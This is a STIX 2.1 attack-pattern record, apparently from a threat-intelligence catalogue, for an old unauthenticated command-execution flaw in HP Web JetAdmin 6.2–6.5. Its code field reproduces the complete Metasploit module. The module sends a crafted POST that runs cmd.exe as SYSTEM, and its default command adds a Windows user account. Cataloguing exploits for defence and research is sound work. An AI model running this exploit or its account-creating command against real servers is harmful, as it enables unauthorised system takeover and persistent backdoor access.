{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--68461073-6a96-4d25-8600-716669181397",
    "created": "2024-08-14T16:24:03.861132Z",
    "modified": "2024-08-14T16:24:03.861135Z",
    "name": "HP Web JetAdmin 6.5 Server Arbitrary Command Execution",
    "description": " This module abuses a command execution vulnerability within the web based management console of the Hewlett-Packard Web JetAdmin network printer tool v6.2 - v6.5. It is possible to execute commands as SYSTEM without authentication. The vulnerability also affects POSIX systems, however at this stage the module only works against Windows. This module does not apply to HP printers. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/hp_web_jetadmin_exec.rb",
            "external_id": "hp_web_jetadmin_exec.rb"
        },
        {
            "source_name": "#CVE",
            "external_id": ",#NoCVE!"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'HP Web JetAdmin 6.5 Server Arbitrary Command Execution',\n        'Description' => %q{\n          This module abuses a command execution vulnerability within the\n          web based management console of the Hewlett-Packard Web JetAdmin\n          network printer tool v6.2 - v6.5. It is possible to execute commands\n          as SYSTEM without authentication. The vulnerability also affects POSIX\n          systems, however at this stage the module only works against Windows.\n          This module does not apply to HP printers.\n        },\n        'Author' => [ 'aushack' ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'OSVDB', '5798' ],\n          [ 'BID', '10224' ],\n          # [ 'CVE', '' ],# No CVE!\n          [ 'EDB', '294' ]\n        ],\n        'DisclosureDate' => '2004-04-27'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8000),\n        OptString.new('CMD', [ false, 'The command to execute.', 'net user metasploit password /add' ]),\n      ]\n    )\n  end\n\n  def run\n    cmd = datastore['CMD'].gsub(' ', ',')\n\n    send_request_cgi({\n      'uri' => '/plugins/framework/script/content.hts',\n      'method' => 'POST',\n      'data' => 'obj=Httpd:ExecuteFile(,cmd.exe,/c,' + cmd + ',)'\n    }, 3)\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-04-27"
}